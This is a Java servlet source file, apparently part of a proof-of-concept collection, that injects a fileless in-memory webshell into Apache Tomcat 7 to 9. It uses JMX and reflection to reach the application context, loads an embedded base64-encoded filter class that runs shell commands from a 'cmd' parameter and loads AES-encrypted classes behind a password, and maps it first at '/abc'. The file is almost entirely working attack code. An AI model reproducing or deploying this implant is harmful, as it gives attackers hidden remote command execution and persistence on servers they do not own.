package com.deserialize.echo.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Set;

public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{
            String filterName = "dynamic1";
            String urlPattern = "/abc";
            String password = "pass";

            MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext)field.get(obj);

                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                if(map.get(filterName) == null) {
                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }

                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADMBKgoAJwCICQBHAIkJAIoAiwgAjAoAjQCOCAB3CwBCAI8IAJAKAJEAkgoAkQCTBwCUCgCVAJYKAJUAlwoAmACZCgALAJoIAJsKAAsAnAoACwCdCwBDAJ4KAJ8AjggAoAcAoQoAFgCICACiCgAWAKMKAKQApQoAFgCmCgAWAKcIAKgKAJEAqQoAkQCqBwCrCwAgAKwIAK0LAK4ArwoAnwCwCgAnALEKACkAsgcAswgAtAcAtQcAZwkAtgC3CgApALgHALkKACkAuggAuwcAvAoAMACICgAwAL0KALYAvgoAvwDACADBCgDCAMMHAMQLAK4AxQoAkQDGCgA3AMcKAMIAyAsAQgDJCgDKAMsKAMIAzAcAzQoAKQDOCADPBwDQBwDRBwDSCgBEANMLANQA1QcA1gcA1wEACHBhc3N3b3JkAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHANgBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZyZXN1bHQBAANjbWQBAANrZXkBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABGNvZGUBAAVieXRlcwEAAltCAQASbXlDbGFzc0xvYWRlckNsYXp6AQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAlldmlsQ2xhc3MBAApldmlsT2JqZWN0AQASTGphdmEvbGFuZy9PYmplY3Q7AQAMdGFyZ2V0TWV0aG9kAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAR0eXBlAQANU3RhY2tNYXBUYWJsZQcA2QcAzQcAtQcA2gcAuQcA1gcA0AcA0QcA2wcA0gcA3AEAB2Rlc3Ryb3kBAAMoKVYBAApTb3VyY2VGaWxlAQAaRHluYW1pY0ZpbHRlclRlbXBsYXRlLmphdmEMAEsAhQwASQBKBwDdDADeAN8BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA4AwA4QBMDADiAOMBAAViYXNpYwcA2QwAzwDkDADlAOYBABFqYXZhL3V0aWwvU2Nhbm5lcgcA5wwA6ADpDADqAOsHAOwMAO0A7gwASwDvAQACXEEMAPAA8QwA8gDzDAD0APUHAPYBAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAD3APgHAPkMAPoA+wwA9wD8DAD9APMBAAEtDAD+AP8MAQABAQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAQIBAwEAAXUHAQQMAQUBBgwBBwBMDAEIAQkMAQoBCwEAEGphdmEvbGFuZy9PYmplY3QBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcBDAwBDQBiDAEOAQ8BAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAEQAQkBAxB5djY2dmdBQUFEUUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwBEQESDAETARQHANoMARUBFgEAA0FFUwcBFwwBGAEZAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBGgEbDAEcAR0MAEsBHgwAUgEfDAEgASEHASIMASMA8wwBJAElAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAEmAScBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEoAIUHANsMAFgBKQEAKmNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAdpc0VtcHR5AQADKClaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmphdmEvdXRpbC9VVUlEAQAKcmFuZG9tVVVJRAEAEigpTGphdmEvdXRpbC9VVUlEOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAVwcmludAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADWdldFN1cGVyY2xhc3MBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAHZG9GaW5hbAEABihbQilbQgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEARwAnAAEASAABAAIASQBKAAAABAABAEsATAABAE0AAABGAAIAAgAAAAoqtwABKiu1AAKxAAAAAgBOAAAADgADAAAAEwAEABQACQAVAE8AAAAWAAIAAAAKAFAAUQAAAAAACgBJAEoAAQABAFIAUwACAE0AAAA1AAAAAgAAAAGxAAAAAgBOAAAABgABAAAAGgBPAAAAFgACAAAAAQBQAFEAAAAAAAEAVABVAAEAVgAAAAQAAQBXAAEAWABZAAIATQAAA+4ABwAQAAACErIAAxIEtgAFKxIGuQAHAgA6BBkExgBQGQQSCLYACZkARisqtAACuQAHAgA6BRkFxgAyGQW2AAqaACq7AAtZuAAMGQW2AA22AA63AA8SELYAEbYAEjoGLLkAEwEAGQa2ABSnAbAZBMYBoxkEEhW2AAmZAZkrKrQAArkABwIAxgBEuwAWWbcAFxIYtgAZuAAatgAbtgAcEh0SGLYAHhAQtgAfOgUrwAAguQAhAQASIhkFuQAjAwAsuQATAQAZBbYAJLEqtgAltgAmOgUZBbYAJToGAToHGQfHADwZBhMAJ6UANBkFtgAlEigGvQApWQMTACpTWQSyACtTWQWyACtTtgAsOgen/9E6CBkGtgAuOgan/8USLzoIuwAwWbcAMRkItgAyOgkZBxkFBr0AJ1kDGQlTWQQDuAAzU1kFGQm+uAAzU7YANMAAKToKEjW4ADY6CxkLBbsAN1m7ABZZtwAXK8AAILkAIQEAEiK5ADgCALYAGxIYtgAZtgActgA5EjW3ADq2ADsZC7sAMFm3ADEruQA8AQC2AD22ADK2AD46DBkKEigFvQApWQMTACpTWQQTAD9TtgAsGQwEvQAnWQMZBVO2ADTAACk6DRkNtgBAOg4ZDRJBBb0AKVkDEwBCU1kEEwBDU7YALDoPGQ8ZDgW9ACdZAytTWQQsU7YANFenABU6BRkFtgBFpwALLSssuQBGAwCxAAMA4QEDAQYALQBzAMAB/wBEAMEB/AH/AEQAAwBOAAAAmgAmAAAAHgAIACAAEgAhACEAIgAtACMAOgAkAFYAJQBhACcAcwApAIAAKgCjACsAtQAsAMAALQDBADAAygAxANEAMgDUADMA4QA1AQMAOAEGADYBCAA3AQ8AOAESADsBFgA8ASQAPQFJAEABUABBAYQAQgGeAEMByABEAc8ARQHoAEYB/ABJAf8ARwIBAEgCBgBJAgkASwIRAE0ATwAAANQAFQBWAAsAWgBKAAYALQA0AFsASgAFAKMAHgBcAEoABQEIAAcAXQBeAAgAygEyAF8AYAAFANEBKwBhAGIABgDUASgAYwBkAAcBFgDmAGUASgAIASQA2ABmAGcACQFJALMAaABiAAoBUACsAGkAagALAZ4AXgBrAGcADAHIADQAbABiAA0BzwAtAG0AbgAOAegAFABvAGQADwIBAAUAXQBwAAUAAAISAFAAUQAAAAACEgBxAHIAAQAAAhIAcwB0AAIAAAISAHUAdgADABICAAB3AEoABAB4AAAAOAAJ/ABhBwB5AvsAXP4AEgcAegcAewcAfHEHAH0L/wDsAAUHAH4HAH8HAIAHAIEHAHkAAQcAggkHAFYAAAAGAAIAgwBXAAEAhACFAAEATQAAACsAAAABAAAAAbEAAAACAE4AAAAGAAEAAABSAE8AAAAMAAEAAAABAFAAUQAAAAEAhgAAAAIAhw==";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);

                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.getDeclaredConstructor(String.class).newInstance(password));
                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }

                    //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                    //其他中间件应该也是类似的
                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                    map.put(filterName, filterConfig);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}